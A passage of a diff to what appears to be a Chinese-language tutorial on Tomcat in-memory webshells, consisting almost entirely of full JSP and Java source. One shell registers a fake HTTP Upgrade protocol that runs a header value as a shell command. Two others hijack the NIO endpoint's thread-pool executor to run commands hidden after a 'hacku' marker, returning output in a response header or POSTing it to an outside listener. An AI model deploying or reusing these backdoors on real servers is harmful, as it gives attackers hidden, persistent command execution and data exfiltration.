+            Request request1 = (Request) requestField.get(rf);
 
-            Field connector = Request.class.getDeclaredField("connector");
-            connector.setAccessible(true);
-            Connector realConnector = (Connector) connector.get(request1);
+            Field connector = Request.class.getDeclaredField("connector");
+            connector.setAccessible(true);
+            Connector realConnector = (Connector) connector.get(request1);
 
-            Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
-            protocolHandlerField.setAccessible(true);
-            AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);
+            Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
+            protocolHandlerField.setAccessible(true);
+            AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);
 
-            HashMap<String, UpgradeProtocol> upgradeProtocols;
-            Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
-            upgradeProtocolsField.setAccessible(true);
-            upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
+            HashMap<String, UpgradeProtocol> upgradeProtocols;
+            Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
+            upgradeProtocolsField.setAccessible(true);
+            upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
 
-            MyUpgrade myUpgrade = new MyUpgrade();
-            upgradeProtocols.put("hello", myUpgrade);
+            MyUpgrade myUpgrade = new MyUpgrade();
+            upgradeProtocols.put("hello", myUpgrade);
 
-            upgradeProtocolsField.set(handler, upgradeProtocols);
-        } catch (Exception ignored) {}
-    }
+            upgradeProtocolsField.set(handler, upgradeProtocols);
+        } catch (Exception ignored) {}
+    }
 }
 
 
@@ -1140,72 +1140,72 @@ public class TestUpgrade extends HttpServlet {
 `jsp`版本为：
 
 ```
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="org.apache.catalina.connector.Connector" %>
-<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
-<%@ page import="org.apache.coyote.UpgradeProtocol" %>
-<%@ page import="java.util.HashMap" %>
-<%@ page import="org.apache.coyote.Processor" %>
-<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
-<%@ page import="org.apache.coyote.Adapter" %>
-<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
-<%@ page import="org.apache.catalina.connector.Request" %>
-<%@ page import="java.nio.ByteBuffer" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Connector" %>
+<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
+<%@ page import="org.apache.coyote.UpgradeProtocol" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="org.apache.coyote.Processor" %>
+<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
+<%@ page import="org.apache.coyote.Adapter" %>
+<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.nio.ByteBuffer" %>
 <%
-    class MyUpgrade implements UpgradeProtocol {
-        public String getHttpUpgradeName(boolean isSSLEnabled) {
-            return "hello";
-        }
+    class MyUpgrade implements UpgradeProtocol {
+        public String getHttpUpgradeName(boolean isSSLEnabled) {
+            return "hello";
+        }
 
-        public byte[] getAlpnIdentifier() {
-            return new byte[0];
-        }
+        public byte[] getAlpnIdentifier() {
+            return new byte[0];
+        }
 
-        public String getAlpnName() {
-            return null;
-        }
+        public String getAlpnName() {
+            return null;
+        }
 
-        public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
-            return null;
-        }
+        public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
+            return null;
+        }
 
-        @Override
-        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, org.apache.coyote.Request request) {
-            return null;
-        }
+        @Override
+        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, org.apache.coyote.Request request) {
+            return null;
+        }
 
-        @Override
-        public boolean accept(org.apache.coyote.Request request) {
-            String p = request.getHeader("cmd");
-            try {
-                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
-                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
-                response.setAccessible(true);
-                org.apache.coyote.Response resp = (org.apache.coyote.Response) response.get(request);
-                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
-                resp.setCharacterEncoding("GBK");
-                resp.doWrite(ByteBuffer.wrap(result));
-            } catch (Exception ignored){}
-            return false;
-        }
-    }
+        @Override
+        public boolean accept(org.apache.coyote.Request request) {
+            String p = request.getHeader("cmd");
+            try {
+                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
+                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
+                response.setAccessible(true);
+                org.apache.coyote.Response resp = (org.apache.coyote.Response) response.get(request);
+                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
+                resp.setCharacterEncoding("GBK");
+                resp.doWrite(ByteBuffer.wrap(result));
+            } catch (Exception ignored){}
+            return false;
+        }
+    }
 %>
 <%
-    Field reqF = request.getClass().getDeclaredField("request");
-    reqF.setAccessible(true);
-    Request req = (Request) reqF.get(request);
-    Field conn = Request.class.getDeclaredField("connector");
-    conn.setAccessible(true);
-    Connector connector = (Connector) conn.get(req);
-    Field proHandler = Connector.class.getDeclaredField("protocolHandler");
-    proHandler.setAccessible(true);
-    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) proHandler.get(connector);
-    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
-    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
-    upgradeProtocolsField.setAccessible(true);
-    upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
-    upgradeProtocols.put("hello", new MyUpgrade());
-    upgradeProtocolsField.set(handler, upgradeProtocols);
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    Field conn = Request.class.getDeclaredField("connector");
+    conn.setAccessible(true);
+    Connector connector = (Connector) conn.get(req);
+    Field proHandler = Connector.class.getDeclaredField("protocolHandler");
+    proHandler.setAccessible(true);
+    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) proHandler.get(connector);
+    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
+    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
+    upgradeProtocolsField.setAccessible(true);
+    upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
+    upgradeProtocols.put("hello", new MyUpgrade());
+    upgradeProtocolsField.set(handler, upgradeProtocols);
 %>
 
 
@@ -1228,150 +1228,150 @@ curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost
 由`2.15.2.3`的分析，我们可以写出下面的内存马：
 
 ```
-<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
-<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
-<%@ page import="java.util.concurrent.TimeUnit" %>
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="java.util.concurrent.BlockingQueue" %>
-<%@ page import="java.util.concurrent.ThreadFactory" %>
-<%@ page import="java.nio.ByteBuffer" %>
-<%@ page import="java.util.ArrayList" %>
-<%@ page import="org.apache.coyote.RequestInfo" %>
-<%@ page import="org.apache.coyote.Response" %>
-<%@ page import="java.io.IOException" %>
-<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
-<%@ page import="java.nio.charset.StandardCharsets" %>
-<%@ page import="java.net.URLEncoder" %>
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
+<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
+<%@ page import="java.util.concurrent.TimeUnit" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="java.util.concurrent.BlockingQueue" %>
+<%@ page import="java.util.concurrent.ThreadFactory" %>
+<%@ page import="java.nio.ByteBuffer" %>
+<%@ page import="java.util.ArrayList" %>
+<%@ page import="org.apache.coyote.RequestInfo" %>
+<%@ page import="org.apache.coyote.Response" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
+<%@ page import="java.nio.charset.StandardCharsets" %>
+<%@ page import="java.net.URLEncoder" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
 <%!
-    public Object getField(Object object, String fieldName) {
-        Field declaredField;
-        Class<?> clazz = object.getClass();
-        while (clazz != Object.class) {
-            try {
-                declaredField = clazz.getDeclaredField(fieldName);
-                declaredField.setAccessible(true);
-                return declaredField.get(object);
-            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
-            clazz = clazz.getSuperclass();
-        }
-        return null;
-    }
+    public Object getField(Object object, String fieldName) {
+        Field declaredField;
+        Class<?> clazz = object.getClass();
+        while (clazz != Object.class) {
+            try {
+                declaredField = clazz.getDeclaredField(fieldName);
+                declaredField.setAccessible(true);
+                return declaredField.get(object);
+            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
+            clazz = clazz.getSuperclass();
+        }
+        return null;
+    }
 
-    public Object getStandardService() {
-        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
-        for (Thread thread : threads) {
-            if (thread == null) {
-                continue;
-            }
-            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
-                Object target = this.getField(thread, "target");
-                Object jioEndPoint = null;
-                try {
-                    jioEndPoint = getField(target, "this$0");
-                } catch (Exception e) {
-                }
-                if (jioEndPoint == null) {
-                    try {
-                        jioEndPoint = getField(target, "endpoint");
-                        return jioEndPoint;
-                    } catch (Exception e) {
-                        new Object();
-                    }
-                } else {
-                    return jioEndPoint;
-                }
-            }
+    public Object getStandardService() {
+        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
+        for (Thread thread : threads) {
+            if (thread == null) {
+                continue;
+            }
+            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
+                Object target = this.getField(thread, "target");
+                Object jioEndPoint = null;
+                try {
+                    jioEndPoint = getField(target, "this$0");
+                } catch (Exception e) {
+                }
+                if (jioEndPoint == null) {
+                    try {
+                        jioEndPoint = getField(target, "endpoint");
+                        return jioEndPoint;
+                    } catch (Exception e) {
+                        new Object();
+                    }
+                } else {
+                    return jioEndPoint;
+                }
+            }
 
-        }
-        return new Object();
-    }
+        }
+        return new Object();
+    }
 
-    class threadexcutor extends ThreadPoolExecutor {
+    class threadexcutor extends ThreadPoolExecutor {
 
-        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
-            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
-        }
+        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
+        }
 
-        public void getRequest(Runnable command) {
-            try {
-                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
-                byteBuffer.mark();
-                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,"socketWrapper");
-                socketWrapperBase.read(false,byteBuffer);
-                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,"socketBufferHandler"),"readBuffer");
-                readBuffer.limit(byteBuffer.position());
-                readBuffer.mark();
-                byteBuffer.limit(byteBuffer.position()).reset();
-                readBuffer.put(byteBuffer);
-                readBuffer.reset();
-                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
-                if (a.contains("hacku")) {
-                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
-                    if (b.length() > 1) {
-                        try {
-                            Runtime rt = Runtime.getRuntime();
-                            Process process = rt.exec("cmd /c " + b);
-                            java.io.InputStream in = process.getInputStream();
-                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
-                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
-                            StringBuilder s = new StringBuilder();
-                            String tmp;
-                            while ((tmp = stdInput.readLine()) != null) {
-                                s.append(tmp);
-                            }
-                            if (!s.toString().isEmpty()) {
-                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
-                                getResponse(res);
-                            }
-                        } catch (IOException ignored) {}
-                    }
-                }
-            } catch (Exception ignored) {}
-        }
+        public void getRequest(Runnable command) {
+            try {
+                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
+                byteBuffer.mark();
+                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,"socketWrapper");
+                socketWrapperBase.read(false,byteBuffer);
+                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,"socketBufferHandler"),"readBuffer");
+                readBuffer.limit(byteBuffer.position());
+                readBuffer.mark();
+                byteBuffer.limit(byteBuffer.position()).reset();
+                readBuffer.put(byteBuffer);
+                readBuffer.reset();
+                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
+                if (a.contains("hacku")) {
+                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
+                    if (b.length() > 1) {
+                        try {
+                            Runtime rt = Runtime.getRuntime();
+                            Process process = rt.exec("cmd /c " + b);
+                            java.io.InputStream in = process.getInputStream();
+                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
+                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
+                            StringBuilder s = new StringBuilder();
+                            String tmp;
+                            while ((tmp = stdInput.readLine()) != null) {
+                                s.append(tmp);
+                            }
+                            if (!s.toString().isEmpty()) {
+                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
+                                getResponse(res);
+                            }
+                        } catch (IOException ignored) {}
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
 
-        public void getResponse(byte[] res) {
-            try {
-                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
-                for (Thread thread : threads) {
-                    if (thread != null) {
-                        String threadName = thread.getName();
-                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
-                            Object target = getField(thread, "target");
-                            if (target instanceof Runnable) {
-                                try {
-                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
-                                    for (Object tmp_object : objects) {
-                                        RequestInfo request = (RequestInfo) tmp_object;
-                                        Response response = (Response) getField(getField(request, "req"), "response");
-                                        String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString());
-                                        response.addHeader("Result", result);
-                                    }
-                                } catch (Exception ignored) {
-                                    continue;
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch (Exception ignored) {
-            }
-        }
+        public void getResponse(byte[] res) {
+            try {
+                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
+                for (Thread thread : threads) {
+                    if (thread != null) {
+                        String threadName = thread.getName();
+                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
+                            Object target = getField(thread, "target");
+                            if (target instanceof Runnable) {
+                                try {
+                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
+                                    for (Object tmp_object : objects) {
+                                        RequestInfo request = (RequestInfo) tmp_object;
+                                        Response response = (Response) getField(getField(request, "req"), "response");
+                                        String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString());
+                                        response.addHeader("Result", result);
+                                    }
+                                } catch (Exception ignored) {
+                                    continue;
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception ignored) {
+            }
+        }
 
-        @Override
-        public void execute(Runnable command) {
-            getRequest(command);
-            this.execute(command, 0L, TimeUnit.MILLISECONDS);
-        }
-    }
+        @Override
+        public void execute(Runnable command) {
+            getRequest(command);
+            this.execute(command, 0L, TimeUnit.MILLISECONDS);
+        }
+    }
 %>
 
 <%
-    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
-    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
-    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
-    nioEndpoint.setExecutor(exe);
+    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
+    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
+    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+    nioEndpoint.setExecutor(exe);
 %>
 
 
@@ -1390,179 +1390,179 @@ curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost
 当然，如果目标条件运行，你也可以利用`yakit`直接外带出来，`jsp`代码如下：
 
 ```
-<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
-<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
-<%@ page import="java.util.concurrent.TimeUnit" %>
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="java.util.concurrent.BlockingQueue" %>
-<%@ page import="java.util.concurrent.ThreadFactory" %>
-<%@ page import="java.nio.ByteBuffer" %>
-<%@ page import="java.io.IOException" %>
-<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
-<%@ page import="java.nio.charset.StandardCharsets" %>
-<%@ page import="java.io.IOException" %>
-<%@ page import="java.io.OutputStream" %>
-<%@ page import="java.net.HttpURLConnection" %>
-<%@ page import="java.net.URL" %>
-<%@ page import="java.nio.ByteBuffer" %>
-<%@ page import="java.nio.charset.StandardCharsets" %>
-<%@ page import="java.util.ArrayList" %>
-<%@ page import="org.apache.coyote.RequestInfo" %>
-<%@ page import="org.apache.coyote.Response" %>
-<%@ page import="java.net.URLEncoder" %>
-<%@ page import="java.util.Arrays" %>
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
+<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
+<%@ page import="java.util.concurrent.TimeUnit" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="java.util.concurrent.BlockingQueue" %>
+<%@ page import="java.util.concurrent.ThreadFactory" %>
+<%@ page import="java.nio.ByteBuffer" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
+<%@ page import="java.nio.charset.StandardCharsets" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.io.OutputStream" %>
+<%@ page import="java.net.HttpURLConnection" %>
+<%@ page import="java.net.URL" %>
+<%@ page import="java.nio.ByteBuffer" %>
+<%@ page import="java.nio.charset.StandardCharsets" %>
+<%@ page import="java.util.ArrayList" %>
+<%@ page import="org.apache.coyote.RequestInfo" %>
+<%@ page import="org.apache.coyote.Response" %>
+<%@ page import="java.net.URLEncoder" %>
+<%@ page import="java.util.Arrays" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
 <%!
-    public Object getField(Object object, String fieldName) {
-        Field declaredField;
-        Class<?> clazz = object.getClass();
-        while (clazz != Object.class) {
-            try {
-                declaredField = clazz.getDeclaredField(fieldName);
-                declaredField.setAccessible(true);
-                return declaredField.get(object);
-            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
-            clazz = clazz.getSuperclass();
-        }
-        return null;
-    }
+    public Object getField(Object object, String fieldName) {
+        Field declaredField;
+        Class<?> clazz = object.getClass();
+        while (clazz != Object.class) {
+            try {
+                declaredField = clazz.getDeclaredField(fieldName);
+                declaredField.setAccessible(true);
+                return declaredField.get(object);
+            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
+            clazz = clazz.getSuperclass();
+        }
+        return null;
+    }
 
-    public Object getStandardService() {
-        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
-        for (Thread thread : threads) {
-            if (thread == null) {
-                continue;
-            }
-            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
-                Object target = this.getField(thread, "target");
-                Object jioEndPoint = null;
-                try {
-                    jioEndPoint = getField(target, "this$0");
-                } catch (Exception ignored) {}
-                if (jioEndPoint == null) {
-                    try {
-                        jioEndPoint = getField(target, "endpoint");
-                        return jioEndPoint;
-                    } catch (Exception e) {
-                        new Object();
-                    }
-                } else {
-                    return jioEndPoint;
-                }
-            }
-        }
-        return new Object();
-    }
+    public Object getStandardService() {
+        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
+        for (Thread thread : threads) {
+            if (thread == null) {
+                continue;
+            }
+            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
+                Object target = this.getField(thread, "target");
+                Object jioEndPoint = null;
+                try {
+                    jioEndPoint = getField(target, "this$0");
+                } catch (Exception ignored) {}
+                if (jioEndPoint == null) {
+                    try {
+                        jioEndPoint = getField(target, "endpoint");
+                        return jioEndPoint;
+                    } catch (Exception e) {
+                        new Object();
+                    }
+                } else {
+                    return jioEndPoint;
+                }
+            }
+        }
+        return new Object();
+    }
 
-    class threadexcutor extends ThreadPoolExecutor {
+    class threadexcutor extends ThreadPoolExecutor {
 
-        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
-            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
-        }
-        
-        public void getRequest(Runnable command) {
-            try {
-                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
-                byteBuffer.mark();
-                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command, "socketWrapper");
-                socketWrapperBase.read(false, byteBuffer);
-                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, "socketBufferHandler"), "readBuffer");
-                readBuffer.limit(byteBuffer.position());
-                readBuffer.mark();
-                byteBuffer.limit(byteBuffer.position()).reset();
-                readBuffer.put(byteBuffer);
-                readBuffer.reset();
-                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
-                if (a.contains("hacku")) {
-                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
-                    if (b.length() > 1) {
-                        try {
-                            Runtime rt = Runtime.getRuntime();
-                            Process process = rt.exec("cmd /c " + b);
-                            java.io.InputStream in = process.getInputStream();
-                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
-                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
-                            StringBuilder s = new StringBuilder();
-                            String tmp;
-                            while ((tmp = stdInput.readLine()) != null) {
-                                s.append(tmp);
-                            }
-                            if (!s.toString().isEmpty()) {
-                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
-                                getResponse(res);
-                            }
-                        } catch (IOException ignored) {
-                        }
-                    }
-                }
-            } catch (Exception ignored) {}
-        }
+        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
+        }
+        
+        public void getRequest(Runnable command) {
+            try {
+                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
+                byteBuffer.mark();
+                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command, "socketWrapper");
+                socketWrapperBase.read(false, byteBuffer);
+                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, "socketBufferHandler"), "readBuffer");
+                readBuffer.limit(byteBuffer.position());
+                readBuffer.mark();
+                byteBuffer.limit(byteBuffer.position()).reset();
+                readBuffer.put(byteBuffer);
+                readBuffer.reset();
+                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
+                if (a.contains("hacku")) {
+                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
+                    if (b.length() > 1) {
+                        try {
+                            Runtime rt = Runtime.getRuntime();
+                            Process process = rt.exec("cmd /c " + b);
+                            java.io.InputStream in = process.getInputStream();
+                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
+                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
+                            StringBuilder s = new StringBuilder();
+                            String tmp;
+                            while ((tmp = stdInput.readLine()) != null) {
+                                s.append(tmp);
+                            }
+                            if (!s.toString().isEmpty()) {
+                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
+                                getResponse(res);
+                            }
+                        } catch (IOException ignored) {
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
 
-        public void getResponse(byte[] res) {
-            try {
-                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
-                for (Thread thread : threads) {
-                    if (thread != null) {
-                        String threadName = thread.getName();
-                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
-                            Object target = getField(thread, "target");
-                            if (target instanceof Runnable) {
-                                try {
-                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
-                                    for (Object tmp_object : objects) {
-                                        RequestInfo request = (RequestInfo) tmp_object;
-                                        Response response = (Response) getField(getField(request, "req"), "response");
-                                        if(sendPostRequest("http://127.0.0.1:8085", res)){
-                                            response.addHeader("Result", "success");
-                                        } else {
-                                            response.addHeader("Result", "failed");
-                                        }
-                                    }
-                                } catch (Exception ignored) {
-                                    continue;
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch (Exception ignored) {}
-        }
+        public void getResponse(byte[] res) {
+            try {
+                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
+                for (Thread thread : threads) {
+                    if (thread != null) {
+                        String threadName = thread.getName();
+                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
+                            Object target = getField(thread, "target");
+                            if (target instanceof Runnable) {
+                                try {
+                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
+                                    for (Object tmp_object : objects) {
+                                        RequestInfo request = (RequestInfo) tmp_object;
+                                        Response response = (Response) getField(getField(request, "req"), "response");
+                                        if(sendPostRequest("http://127.0.0.1:8085", res)){
+                                            response.addHeader("Result", "success");
+                                        } else {
+                                            response.addHeader("Result", "failed");
+                                        }
+                                    }
+                                } catch (Exception ignored) {
+                                    continue;
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
 
-        private boolean sendPostRequest(String urlString, byte[] data) {
-            try {
-                URL url = new URL(urlString);
-                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                connection.setRequestMethod("POST");
-                connection.setDoOutput(true);
-                connection.setRequestProperty("Content-Type", "application/octet-stream");
-                connection.setRequestProperty("Content-Length", String.valueOf(data.length));
-                try (OutputStream outputStream = connection.getOutputStream()) {
-                    outputStream.write(data);
-                    outputStream.flush();
-                    int responseCode = connection.getResponseCode();
-                    return responseCode == HttpURLConnection.HTTP_OK;
-                } catch (Exception ignored){
-                    return false;
-                }
-            } catch (IOException ignored) {
-                return false;
-            }
-        }
+        private boolean sendPostRequest(String urlString, byte[] data) {
+            try {
+                URL url = new URL(urlString);
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("POST");
+                connection.setDoOutput(true);
+                connection.setRequestProperty("Content-Type", "application/octet-stream");
+                connection.setRequestProperty("Content-Length", String.valueOf(data.length));
+                try (OutputStream outputStream = connection.getOutputStream()) {
+                    outputStream.write(data);
+                    outputStream.flush();
+                    int responseCode = connection.getResponseCode();
+                    return responseCode == HttpURLConnection.HTTP_OK;
+                } catch (Exception ignored){
+                    return false;
+                }
+            } catch (IOException ignored) {
+                return false;
+            }
+        }
 
-        @Override
-        public void execute(Runnable command) {
-            getRequest(command);
-            this.execute(command, 0L, TimeUnit.MILLISECONDS);
-        }
-    }
+        @Override
+        public void execute(Runnable command) {
+            getRequest(command);
+            this.execute(command, 0L, TimeUnit.MILLISECONDS);
+        }
+    }
 %>
 
 <%
-    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
-    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
-    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
-    nioEndpoint.setExecutor(exe);
